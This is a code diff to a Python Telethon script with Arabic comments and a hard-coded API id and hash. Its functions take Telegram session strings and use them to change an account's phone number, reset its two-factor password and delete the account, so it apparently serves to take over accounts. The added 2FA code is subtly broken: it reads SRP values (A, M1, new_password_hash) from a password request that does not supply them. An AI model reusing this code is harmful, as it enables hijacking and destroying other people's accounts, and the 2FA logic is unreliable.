@@ -48,35 +48,33 @@ async def change_number(strses, number):
     ))
     return str(result)
 
-# تعريف وظيفة تغيير التحقق بخطوتين (2FA)
 async def change_2fa(strses, current_password, new_password, hint=""):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
         bot = client = X
         try:
+            # الحصول على كلمة المرور الحالية
+            password = await bot(functions.account.GetPasswordRequest())
+            
+            # إنشاء إعدادات كلمة المرور الجديدة
+            new_settings = types.account.PasswordInputSettings(
+                new_algo=password.new_algo,
+                new_password_hash=await bot(functions.account.GetPasswordRequest()).new_password_hash,
+                hint=hint,
+                email=""
+            )
+            
+            # تحديث إعدادات التحقق بخطوتين
             await bot(functions.account.UpdatePasswordSettingsRequest(
-                current_password_hash=current_password,
-                new_settings=types.account.PasswordInputSettings(
-                    new_salt=new_password,
-                    hint=hint,
-                    email=""
-                )
+                password=types.InputCheckPasswordSRP(
+                    srp_id=password.srp_id,
+                    A=password.A,
+                    M1=await bot(functions.account.GetPasswordRequest()).M1
+                ),
+                new_settings=new_settings
             ))
             return True
         except Exception as e:
             return str(e)
-          
-async def userinfo(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    k = await X.get_me()
-    return str(k)
-
-async def terminate(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-        await X(rt())
-        return True
-    except Exception as rr:
-        return rr
 
 GROUP_LIST = []
 async def delacc(strses):
